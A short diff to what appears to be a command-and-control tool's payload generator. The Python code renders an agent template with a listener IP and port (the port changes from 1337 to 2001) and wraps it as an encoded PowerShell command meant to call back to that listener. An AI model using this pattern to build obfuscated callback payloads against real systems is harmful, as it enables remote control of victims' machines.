@@ -14,11 +14,11 @@ def generate_payload():
     # render template with listeners ip and port
     agent_payload = template.render(
         LISTENER_IP="127.0.0.1", # TODO: read from options
-        LISTENER_PORT=1337            
+        LISTENER_PORT=2001
     )
 
     payload = f"powershell -EncodedCommand {powershell_encode(agent_payload)}"
-    
+
     return payload
 
 def powershell_encode(data):
